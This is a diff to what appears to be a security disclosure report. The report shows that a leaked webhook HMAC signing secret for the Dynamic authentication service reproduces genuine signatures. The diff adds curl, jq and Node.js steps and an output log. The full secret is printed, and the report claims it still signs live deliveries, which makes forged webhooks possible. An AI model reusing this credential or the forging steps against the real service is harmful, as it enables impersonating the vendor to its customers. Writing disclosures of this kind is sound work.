@@ -60,10 +60,26 @@ curl -sS -X POST "https://app.dynamicauth.com/api/v0/environments/7dfe3b0c-c0db-
 
 ### 4b. Capture the raw body and the signature header
 
+> **⚠ Two reproduction pitfalls (both verified live — do not skip this box):**
+> 1. **Do NOT use `.data[0]`** — it selects whichever delivery is *newest*. Any traffic
+>    after the genuine capture (new triggers, your own tests, the forged delivery itself)
+>    lands on top and its signature will NOT match the hardcoded one. **Pin the delivery
+>    by `uuid`.**
+> 2. **Do NOT use `jq -r`** to write the body file — `-r` appends a trailing newline
+>    (`1913` bytes instead of `1912`), which silently breaks the HMAC. **Use `jq -j`**
+>    (raw, no newline) for byte-exact output.
+
 ```bash
-curl -s "https://webhook.site/token/72e683f6-959e-4264-8aa8-82f389ed746d/requests?page=1&sorting=newest" \
-  | jq '.data[0] | {uuid, created_at, sig: .headers["x-dynamic-signature-256"][0], body: .content}' \
-  | tee capture.json && jq -r '.body' capture.json > body.txt   # exact bytes
+curl -s "https://webhook.site/token/72e683f6-959e-4264-8aa8-82f389ed746d/requests?page=1&sorting=newest" > inbox.json
+
+# pin the GENUINE delivery explicitly by uuid (do not rely on list order):
+jq '.data[] | select(.uuid=="701cbc0c-c24e-4524-aa2c-584c1c47159e")
+    | {uuid, created_at, sig: .headers["x-dynamic-signature-256"][0], body: .content}' \
+    inbox.json | tee capture.json
+
+# -j = raw output with NO trailing newline -> exact bytes ('-r' would add \n and break the HMAC):
+jq -j '.body' capture.json > body.txt
+wc -c body.txt        # must print 1912 — if it prints 1913 you used -r by mistake
 ```
 
 **Actual capture (delivery `701cbc0c-c24e-4524-aa2c-584c1c47159e` @ 2026-10-26 01:27:37):**
@@ -83,15 +99,15 @@ raw body: 1912 bytes (full body in Appendix A)
 // verify.js — run: node verify.js
 const crypto = require('crypto');
 const SECRET = 'dyn_Qfvm49E4cdO0AewRTjk{PAGBhx2t[RNpVMqajPTaQaq4Yme[f12LQka9'; // leaked
-const rawBody  = require('fs').readFileSync('body.txt');   // unmodified bytes from 4b
+const rawBody  = require('fs').readFileSync('body.txt');   // exact bytes (body.txt written with jq -j)
 const captured = '5fb5c66ff01f0991c7db28cc106ddf57ec43779b1c8c935c3df1bfd7426cc3a4';
-const computed = crypto.createHmac('sha256', SECRET).update(rawBody, 'utf8').digest('hex');
+const computed = crypto.createHmac('sha256', SECRET).update(rawBody).digest('hex');
 console.log('computed:', computed);
 console.log('captured:', captured);
 console.log('EXACT MATCH:', computed === captured);
 ```
 
-**Actual output:**
+**Actual output (corrected pipeline):**
 
 ```
 computed: 5fb5c66ff01f0991c7db28cc106ddf57ec43779b1c8c935c3df1bfd7426cc3a4
@@ -99,10 +115,30 @@ captured: 5fb5c66ff01f0991c7db28cc106ddf57ec43779b1c8c935c3df1bfd7426cc3a4
 EXACT MATCH: true
 ```
 
+**Pitfall sanity-check (both bugs reproduce as `false` if ignored):**
+
+```
+jq -r body (1913B, extra newline) -> 14542f3d…de60  MATCH: false   <- wrong tool flag
+.data[0] body (newest delivery)   -> <newest sig>   MATCH: false   <- unpinned selection
+jq -j body (1912B, exact bytes)   -> 5fb5c66f…cc3a4 MATCH: true
+```
+
+Newline-free one-liner alternative (body kept in memory, zero shell pitfalls):
+
+```bash
+node -e "const c=require('crypto'),fs=require('fs');
+const cap=JSON.parse(fs.readFileSync('capture.json','utf8'));
+console.log('EXACT MATCH:',
+  c.createHmac('sha256','dyn_Qfvm49E4cdO0AewRTjk{PAGBhx2t[RNpVMqajPTaQaq4Yme[f12LQka9')
+   .update(cap.body,'utf8').digest('hex') === cap.sig.replace(/^sha256=/,''))"
+```
+
 → The revealed secret is **not a placeholder**: it is the exact HMAC key Dynamic's own
 infrastructure used to sign a delivery that arrived one second earlier. This has now been
-reproduced on **independent deliveries** (first: `38260fc6…039b9` @ 2026-10-25 23:27, second:
-`5fb5c66f…cc3a4` @ 2026-10-26 01:27).
+reproduced on **independent deliveries** (first: `38260fc6…039b9` @ 2026-10-25 23:27,
+second: `5fb5c66f…cc3a4` @ 2026-10-26 01:27, third: `ea9cace2…5a873` @ 2026-10-26 02:17 —
+the third being a delivery triggered *after* initial disclosure, proving the key
+continuously signs live traffic and any delivery can be verified once pinned by uuid).
 
 ---
 
